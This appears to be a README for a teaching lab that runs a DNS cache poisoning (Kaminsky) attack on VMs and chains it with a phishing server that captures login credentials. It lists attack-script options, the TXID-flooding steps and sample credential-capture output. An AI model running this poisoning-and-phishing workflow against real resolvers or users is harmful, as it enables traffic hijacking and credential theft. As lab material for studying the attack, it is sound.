# DNS Cache Poisoning Attack Lab

This project demonstrates a DNS cache poisoning attack (Kaminsky attack) using a custom DNS server and attack script.

## Network Setup

The lab uses 3 Kali Linux VMs in VirtualBox:

- **Attacker**: `10.0.0.10`
- **Router**: `10.0.0.1` 
- **DNS Server**: `10.0.0.53`

## Prerequisites

### On DNS Server VM:
```bash
# Install Python dependencies
sudo apt update
sudo apt install python3-pip python3-venv

# Create and activate virtual environment
python3 -m venv dns_env
source dns_env/bin/activate

# Install required packages
pip install scapy
```

### On Attacker VM:
```bash
# Install Python dependencies
sudo apt update
sudo apt install python3-pip python3-venv

# Create and activate virtual environment
python3 -m venv attack_env
source attack_env/bin/activate

# Install required packages
pip install scapy
```

## Running the Attack

### Step 1: Start the Custom DNS Server

On the **DNS Server VM** (`10.0.0.53`):

```bash
# Navigate to project directory
cd /path/to/DNS-Cache-Poisoning-Phishing-Attack

# Activate virtual environment
source dns_env/bin/activate

# Start the custom DNS server (requires root for port 53)
sudo python3 custom_dns_server.py
```

Expected output:
```
[+] Custom DNS Server started on 0.0.0.0:53
[+] Forwarding queries to 8.8.8.8
[+] VULNERABLE to cache poisoning - accepts spoofed responses
```

### Step 2: Run the Attack

On the **Attacker VM** (`10.0.0.10`):

```bash
# Navigate to project directory
cd /path/to/DNS-Cache-Poisoning-Phishing-Attack

# Activate virtual environment
source attack_env/bin/activate

# Run the attack (requires root for packet spoofing)
sudo python3 attack.py --responses 10
```

### Step 3: Monitor the Attack

You can monitor the attack progress using `tcpdump` on both machines:

**On DNS Server:**
```bash
sudo tcpdump -i any -n udp port 53
```

**On Attacker:**
```bash
sudo tcpdump -i any -n udp port 53
```

## Attack Parameters

The attack script supports several parameters:

```bash
sudo python3 attack.py [OPTIONS]

Options:
  --resolver IP          Target DNS resolver (default: 10.0.0.53)
  --attacker-ip IP       Attacker's IP (default: 10.0.0.10)
  --real-ns IP           Real nameserver to impersonate (default: 8.8.8.8)
  --domain DOMAIN        Target domain to poison (default: my-lab-bank.com)
  --tries N              Number of attack attempts (default: 100)
  --requests N           Initial DNS queries per attempt (default: 10)
  --responses N          Spoofed responses per attempt (default: 65536)
```

## Example Attack Scenarios

### Quick Test (10 responses):
```bash
# Activate virtual environment first
source attack_env/bin/activate
sudo python3 attack.py --responses 10
```

### Full Attack (all possible TXIDs):
```bash
# Activate virtual environment first
source attack_env/bin/activate
sudo python3 attack.py --responses 65536
```

### Multiple Attempts:
```bash
# Activate virtual environment first
source attack_env/bin/activate
sudo python3 attack.py --tries 5 --responses 1000
```

## Expected Attack Flow

1. **DNS Server** receives query for random subdomain (e.g., `12345.my-lab-bank.com`)
2. **DNS Server** forwards query to `8.8.8.8` with TXID 1-6
3. **Attacker** floods with spoofed responses containing `10.0.0.10`
4. **DNS Server** accepts spoofed response and caches `my-lab-bank.com` → `10.0.0.10`
5. **Verification** query confirms cache poisoning

## Success Indicators

### DNS Server Logs:
```
[PENDING] Added pending query: txid=6, domain=12345.my-lab-bank.com
[CAPTURE] *** SPOOFED RESPONSE DETECTED ***
[MATCH] Response matches pending query for 12345.my-lab-bank.com
[CACHE] Cached main domain (spoofed): my-lab-bank.com -> 10.0.0.10
```

### Attack Script Output:
```
[SUCCESS] DNS cache poisoned! my-lab-bank.com -> 10.0.0.10
```

## Troubleshooting

### Common Issues:

1. **Permission Denied**: Use `sudo` for both DNS server and attack script
2. **Port 53 in Use**: Stop BIND service: `sudo systemctl stop named`
3. **Network Issues**: Ensure all VMs can ping each other
4. **Scapy Import Error**: Make sure virtual environment is activated and scapy is installed
5. **Virtual Environment Not Found**: Create virtual environment first using the prerequisites section

### Verification Commands:

**Test DNS Server:**
```bash
nslookup google.com 10.0.0.53
```

**Check Cache:**
```bash
# In DNS server logs, look for [CACHE] entries
```

**Monitor Network:**
```bash
sudo tcpdump -i any -n udp port 53 -vv
```

## Phishing Attack Integration

After successful DNS cache poisoning, victims will be redirected to a fake login page that captures their credentials.

### Step 3: Start the Phishing Server

On the **Attacker VM** (`10.0.0.10`):

```bash
# Navigate to phishing directory
cd phishing_site

# Install dependencies
pip install -r requirements.txt

# Start the phishing server
python3 server.py
```

Expected output:
```
============================================================
🎣 PHISHING SERVER STARTED 🎣
============================================================
Server: http://10.0.0.10:8080
Phishing page: http://10.0.0.10:8080/
View credentials: http://10.0.0.10:8080/credentials
Clear credentials: http://10.0.0.10:8080/clear
Server status: http://10.0.0.10:8080/status
============================================================
Waiting for victims to submit credentials...
============================================================
```

### Step 4: Simulate Victim Access

After successful DNS cache poisoning, when a victim tries to access `my-lab-bank.com`:

```bash
# From any machine (victim simulation)
nslookup my-lab-bank.com 10.0.0.53
# Should return: my-lab-bank.com -> 10.0.0.10

# Open browser and visit:
# http://my-lab-bank.com (will redirect to 10.0.0.10:8080)
```

### Step 5: Monitor Captured Credentials

When victims submit credentials on the phishing page:

**In Attacker Console:**
```
============================================================
🎯 CREDENTIALS CAPTURED! 🎯
============================================================
Username: john.doe
Password: mypassword123
IP Address: 10.0.0.15
User Agent: Mozilla/5.0...
Timestamp: 2024-01-15T10:30:00.000Z
Referrer: 
============================================================
Total credentials captured: 1
============================================================
```

**View All Credentials:**
```bash
# In browser: http://10.0.0.10:8080/credentials
# Or via curl:
curl http://10.0.0.10:8080/credentials
```

## Complete Attack Flow

1. **DNS Cache Poisoning**: `my-lab-bank.com` → `10.0.0.10`
2. **Victim Access**: Victim visits `my-lab-bank.com`
3. **DNS Resolution**: Victim gets poisoned IP `10.0.0.10`
4. **Phishing Page**: Victim sees fake login page
5. **Credential Capture**: Victim submits credentials
6. **Attacker Console**: Credentials displayed in real-time

## Security Note

This is a **lab environment only**. The custom DNS server and phishing server are intentionally vulnerable to demonstrate the attack. Never use this configuration in production. 